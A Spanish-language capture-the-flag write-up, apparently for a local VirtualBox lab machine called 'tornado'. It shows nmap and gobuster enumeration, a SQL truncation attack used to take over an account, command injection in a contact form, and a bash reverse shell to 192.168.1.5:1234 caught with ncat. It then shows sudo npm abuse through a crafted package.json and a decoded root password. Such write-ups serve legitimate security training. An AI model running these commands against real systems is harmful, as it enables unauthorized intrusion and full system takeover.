@@ -1,0 +1,171 @@
+Identificamos la IP de la máquina víctima:
+❯ arp-scan --interface=wlo1 --localnet | grep PCS | awk '{print $1}'
+192.168.1.6 
+
+❯ sudo nmap -p- -sS --min-rate 5000 -n -Pn -oG 01-allPorts 192.168.1.6
+[sudo] contraseña para wh01s17: 
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-05 16:54 -0400
+Nmap scan report for 192.168.1.6
+Host is up (0.00033s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:9C:BF:E3 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
+
+❯ nmap -sCV -p 22,80 -oN 02-targeted.txt 192.168.1.6
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-05 16:54 -0400
+Nmap scan report for 192.168.1.6
+Host is up (0.00032s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 0f:57:0d:60:31:4a:fd:2b:db:3e:9e:2f:63:2e:35:df (RSA)
+|   256 00:9a:c8:d3:ba:1b:47:b2:48:a8:88:24:9f:fe:33:cc (ECDSA)
+|_  256 6d:af:db:21:25:ee:b0:a6:7d:05:f3:06:f0:65:ff:dc (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds
+
+Enumeramos directorios:
+❯ gobuster dir -u 'http://192.168.1.6' -w ~/Documentos/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,sql,xml,zip,sh,db -r 
+...
+/index.html           (Status: 200) [Size: 10701]
+/manual               (Status: 200) [Size: 626]
+/javascript           (Status: 403) [Size: 276]
+/bluesky              (Status: 200) [Size: 14979]
+/server-status        (Status: 403) [Size: 276]
+...
+
+Enumeramos /bluesky:
+❯ gobuster dir -u 'http://192.168.1.6/bluesky' -w ~/Documentos/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,sql,xml,zip,sh,db -r 
+...
+/index.html           (Status: 200) [Size: 14979]
+/contact.php          (Status: 200) [Size: 824]
+/about.php            (Status: 200) [Size: 824]
+/login.php            (Status: 200) [Size: 824]
+/signup.php           (Status: 200) [Size: 825]
+/css                  (Status: 200) [Size: 1382]
+/imgs                 (Status: 200) [Size: 4334]
+/js                   (Status: 200) [Size: 1188]
+/logout.php           (Status: 200) [Size: 824]
+/dashboard.php        (Status: 200) [Size: 824]
+/port.php             (Status: 200) [Size: 824]
+...
+
+Ingresamos a http://192.168.1.6/bluesky/signup.php y nos creamos una cuenta:
+email: test@test.com
+password: asdf
+
+Iniciamos sesión en http://192.168.1.6/bluesky/login.php.
+
+En el código fuente encontramos un comentario:
+<!-- /home/tornado/imp.txt -->
+
+Descargamos el archivo y vemos que contiene un listado de emails:
+❯ wget 'http://192.168.1.6/~tornado/imp.txt'
+
+❯ cat imp.txt
+ceo@tornado
+cto@tornado
+manager@tornado
+hr@tornado
+lfi@tornado
+admin@tornado
+jacob@tornado
+it@tornado
+sales@tornado
+
+Analizando el login.php y signup.php, verificamos que el maxlength esta establecido en 13 por lo que hacemos pruebas de un SQL Truncation Attack.
+
+Ingresamos nuevamente a http://192.168.1.6/bluesky/signup.php, y probamos sobrescribiendo el usuario jacob@tornado, cambiando el maxlength por 15, y poniendo la contraseña que queramos:
+original: <input type="text" name="uname" placeholder="email" maxlength="13">
+
+modificado: <input type="text" name="uname" placeholder="email" maxlength="15">
+
+email: jacob@tornadoas
+password: asdf 
+
+Luego nos logueamos como jacob@tornado y la contraseña asdf.
+
+Dentro de la pestaña contact, http://192.168.1.6/bluesky/contact.php, encontramos una sección de comentarios, que al parecer es vulnerable a inyección de comandos, que si bien no vemos el resultado, lo comprobamos al ejecutar el comando sleep y el tiempo de carga de la página:
+sleep 5
+
+Ejecutamos una reverse shell:
+bash -c "bash -i >& /dev/tcp/192.168.1.5/1234 0>&1"
+
+❯ ncat -nlvp 1234
+Ncat: Version 7.97 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 192.168.1.6:60806.
+bash: cannot set terminal process group (510): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@tornado:/var/www/html/bluesky$
+
+Obtenemos una shell del usuario www-data.
+
+Listamos los usuarios con una bash establecida:
+www-data@tornado:/var/www/html/bluesky$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+catchme:x:1000:1000:catchme,,,:/home/catchme:/bin/bash
+tornado:x:1001:1001:,,,:/home/tornado:/bin/bash
+
+Para escalar al usuario catchme, ejecutamos el comando sudo -l:
+www-data@tornado:/var/www/html/bluesky$ sudo -l
+Matching Defaults entries for www-data on tornado:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on tornado:
+    (catchme) NOPASSWD: /usr/bin/npm
+
+Vemos que podemos ejecutar el comando npm como el usuario catchme sin contraseña.
+
+Para obtener una shell de catchme, creamos un directorio en /tmp llamado pwned:
+www-data@tornado:/tmp$ mkdir pwned
+
+Dentro creamos un archivo package.json:
+www-data@tornado:/tmp/pwned$ echo '{ "name": "pwned", "version": "1.0.0", "scripts": { "shell": "/bin/bash" } }' > package.json
+
+Ejecutamos el comando con npm:
+www-data@tornado:/tmp/pwned$ sudo -u catchme npm run shell 
+npm WARN npm npm does not support Node.js v10.21.0
+npm WARN npm You should probably upgrade to a newer version of node as we
+npm WARN npm can't make any promises that npm will work with this version.
+npm WARN npm Supported releases of Node.js are the latest release of 4, 6, 7, 8, 9.
+npm WARN npm You can find the latest version at https://nodejs.org/
+
+> pwned@1.0.0 shell /tmp/pwned
+> /bin/bash
+
+catchme@tornado:/tmp/pwned$ 
+
+Obtenemos una shell de catchme y la primera flag.
+
+En el directorio home del usuario, encontramos un script en python, el cuál contiene un mensaje cifrado:
+catchme@tornado:~$ cat enc.py
+...
+encrypted="hcjqnnsotrrwnqc"
+...
+
+Decodificamos con https://www.dcode.fr/caesar-cipher:
+...
+🠞25 (🠜1)	idkrootpussxord
+...
+
+Probamos loguearnos como root con la contraseña sin éxito, pero realizamos un cambio, idkrootpussxord por idkrootpassword, y tenemos éxito:
+catchme@tornado:~$ su root
+Password: idkrootpassword
+
+root@tornado:/home/catchme#
+
+Obtenemos la flag y fin.
+
